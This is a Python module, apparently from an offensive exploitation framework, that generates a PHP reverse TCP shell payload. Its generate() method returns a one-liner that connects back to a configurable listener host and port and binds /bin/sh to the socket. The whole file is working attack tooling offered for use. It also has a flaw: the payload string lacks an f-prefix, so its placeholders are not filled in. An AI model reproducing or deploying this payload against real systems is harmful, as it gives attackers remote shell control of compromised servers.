from deathnote_module import *


class Module(Payload):
    
    __info__ = {
            'name': 'Php shell reverse tcp',
            'description': 'Php shell reverse tcp',
            'category': 'singles',
            'platform': 'php',
            'arch': 'php',
            'handler': 'listeners/multi/reverse_tcp',
            'type': 'reverse',
        }

    lhost = OptString('127.0.0.1', 'Connect to IP address', 'yes', False)
    lport = OptPort(5555, 'Bind Port', 'yes', False)

    def generate(self):
    
        payload = "php -r '$sock=fsockopen(\"{self.lhost}\",{self.lport});$proc=proc_open(\"/bin/sh\", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'"

        return payload
